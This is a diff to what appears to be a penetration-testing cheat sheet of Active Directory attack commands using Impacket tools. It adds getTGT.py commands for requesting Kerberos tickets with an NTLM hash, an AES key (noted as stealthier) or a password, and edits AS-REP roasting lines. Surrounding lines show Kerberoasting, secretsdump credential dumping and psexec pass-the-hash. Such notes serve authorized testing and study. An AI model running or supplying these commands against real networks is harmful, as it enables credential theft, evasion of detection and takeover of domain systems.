@@ -669,9 +669,18 @@ python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all {DOMAIN}/{US
 python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {IP ADDRESS}
 
 # ASREP ROAST
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request {DOMAIN1.DOMAIN2}/ -dc-ip {IP ADDRESS} -format john
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request {DOMAIN}/ -dc-ip {IP ADDRESS} -format john
 
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {DOMAIN1.DOMAIN2}/ -dc-ip {IP ADDRESS} -usersfile {USER.txt} -format john
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {DOMAIN}/ -dc-ip {IP ADDRESS} -usersfile {USER.txt} -format john
+
+# Request the TGT with hash
+python3 /usr/share/doc/python3-impacket/examples/getTGT.py {DOMAIN}/{USERNAME} -hashes {LM HASH}:{NTLM HASH}
+
+# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
+python getTGT.py {DOMAIN}/{USERNAME} -aesKey {AES KEY}
+
+# Request the TGT with password
+python getTGT.py {DOMAIN}/{USERNAME}:{PASSWORD}
 
 # Bloodhound
 sudo neo4j console                          # LHOST
@@ -696,9 +705,6 @@ sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py '{DOMAIN}/{
 sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes {HASH1:HASH2} {USERNAME}@{IP ADDRESS}
 
 ```
-
-
-
 
 
 <br />
